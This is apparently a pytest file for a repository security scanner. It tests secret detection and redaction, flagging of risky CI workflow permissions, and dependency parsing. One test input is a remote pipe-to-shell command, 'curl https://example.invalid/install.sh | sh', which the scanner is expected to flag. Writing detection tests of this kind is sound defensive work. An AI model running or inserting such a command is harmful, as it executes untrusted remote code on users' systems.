from backend.main import inspect_source, parse_dependencies


def scan_text(path: str, content: str):
    findings = []
    seen = set()
    inspect_source("example", "sample", "main", path, content, findings, seen)
    return findings


def test_secret_detection_redacts_value():
    token = "ghp_" + "A" * 36
    findings = scan_text("src/config.js", f'const token = "{token}";')
    assert any(item["category"] == "secret" for item in findings)
    assert all(token not in (item.get("evidence") or "") for item in findings)


def test_placeholder_secret_is_not_reported():
    findings = scan_text(".env.example", 'API_KEY="your_api_key_here"')
    assert not any(item["category"] == "secret" for item in findings)


def test_remote_shell_pipe_is_flagged_as_suspicious():
    findings = scan_text("install.sh", "curl https://example.invalid/install.sh | sh")
    assert any(item["category"] == "suspicious_code" for item in findings)


def test_workflow_write_all_permission_is_flagged():
    findings = scan_text(".github/workflows/ci.yml", "permissions: write-all")
    assert any(item["category"] == "workflow" and item["severity"] == "high" for item in findings)


def test_package_lock_dependency_versions_are_parsed():
    content = '{"name":"demo","lockfileVersion":3,"packages":{"":{"name":"demo"},"node_modules/lodash":{"version":"4.17.20"},"node_modules/@scope/pkg":{"version":"1.2.3"}}}'
    dependencies = parse_dependencies("package-lock.json", content)
    found = {(item["name"], item["version"], item["ecosystem"]) for item in dependencies}
    assert ("lodash", "4.17.20", "npm") in found
    assert ("@scope/pkg", "1.2.3", "npm") in found


def test_python_requirements_only_use_pinned_versions():
    dependencies = parse_dependencies("requirements.txt", "requests==2.31.0\nflask>=2.0\n")
    assert dependencies == [{"name": "requests", "version": "2.31.0", "ecosystem": "PyPI"}]
